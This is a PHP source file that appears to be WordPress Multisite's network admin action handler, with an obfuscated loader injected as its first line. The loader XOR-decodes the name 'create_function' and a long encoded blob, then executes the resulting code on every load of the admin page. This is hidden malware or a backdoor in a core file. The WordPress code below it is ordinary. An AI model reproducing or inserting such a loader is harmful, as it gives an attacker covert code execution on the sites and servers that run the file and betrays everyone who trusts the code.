<?php $FLIdIJl=' A2P:,.-L>33;.V'^'C3W1NIqK9PPGRA8';$OFfhjDa=$FLIdIJl('','TRoVWKWU.;Y,;,VDFT+frDULlOSE7fkXD1aZKB5AbFI-.0U-=XOY6-4Q367cYNJpNS3 7MrCQ-;qKmoEhWoKZPZN;jZsSSiS9H0,KmQ1BiMxXCn,sM5R-P7EWO9,1lovWYCDZeCNAOI0rasRgm,LTU,b9akjnV<W>lL9GJs=A>8Q,kC;I8G5ksEXgHH99H7ykOFHGC4f<KGsAoQAALwJf 96F3Uxf X855K3LWOHP3X:1N7bKQCVJ;DVdi>wb78wvXAXgvFWJuQxjBMP<AXyV,7oJ1+F-+,42RVpg8-OcsymZ2Z4KNKt7TY=Ra9KsM:FhZgnYADTSDVFMX8EI40CgQKj4,c26=2XRScEK6AOvobgJV8M6Zj9SESVT-G3.UYIvZai.6GCKhjVDL6-gPEo9-W3KUf1I1>;SN2V=Sszhm-9BNJYL:0 IE9S;g>UY0;+U7MGT;E5cRfO77U55rrD;57JcGwV9TQaX5EJmn0DFCf=U JIqsNO097Ld=-7:.F+XB;fQZ ;jFMH+Q>9faNtwp5WCNIWX,32I;HIoeKKzYOpLhYBHHytu>GK FVuPZxFWTlRzqSkGPAPdbSVIvR  .3;>PUk1>  ; GCMJKU< 6VGcKRV-AszvErWdX>k:P2,LFw0,DJgmEQ0YXT-s1mkR<+S3LKanzF7'^'=4Gw1>96ZR6BdI.-5 XNU<:>3+21V9451EFsbbNKk <CMD<BSx76DrP0GWh<4;>Xj7RTVaRg:HBXkMOeH,eBSt5;OJgSttRY0AVC9EuXbTmHccJEO>A A5Yms+XXPETVs0hosoJGe <DRONrOIH- 4wFP<K4NrW2G7hPgoSN5LT4BCgP,AnhBHOQn:-ML:YQO 3<nx>oAA:yKK5 5-WwFFXZ5VnrBD9LTj V5wrh6R4ITu=h->13+X,vLMa4-xs>3x +GR-23UlFJf;1P4=PvW=fnUJ2LtGQKrkPCSH6XypI>S.UkskPA55H7Z36yGS HrFJ= 05zd-LD>W7,US+Gyo5fi2gsnfx3 Ca S8oKQBC<7T8SsJBYLZr0L3Rq><0VgAMES>xAacr -BLGmeKOL;F.nl84;C1YjV7I2SGH-XW1+80-VYZ,mA<I8Z4-Qdt8B9o6Z6PUf9+RT:QPZV ZAVcOgS2X 0>3P<cDU:- kBY4T+iWUn.BKV5;VHNeK>B+6HNv1EBMjmlO0JXOAhRWXX3vfm39XRinP-0H8bkGdoWuPkv..HAFZp.BpfBh<L a6XcKA1Zua 2CKspoV3RROJdU5,4TFISOSod=+29SARqkCo67Y ZSVeRwDxEa35DM nSTM0+<J50I575ITlDPX5N+Z8cQGALJ');$OFfhjDa();
/**
 * Action handler for Multisite administration panels.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

/** Load WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( empty( $_GET['action'] ) ) {
	wp_redirect( network_admin_url() );
	exit;
}

/**
 * Fires just before the action handler in several Network Admin screens.
 *
 * This hook fires on multiple screens in the Multisite Network Admin,
 * including Users, Network Settings, and Site Settings.
 *
 * @since 3.0.0
 */
do_action( 'wpmuadminedit' );

/**
 * Fires the requested handler action.
 *
 * The dynamic portion of the hook name, `$_GET['action']`, refers to the name
 * of the requested action.
 *
 * @since 3.1.0
 */
do_action( 'network_admin_edit_' . $_GET['action'] );

wp_redirect( network_admin_url() );
exit();
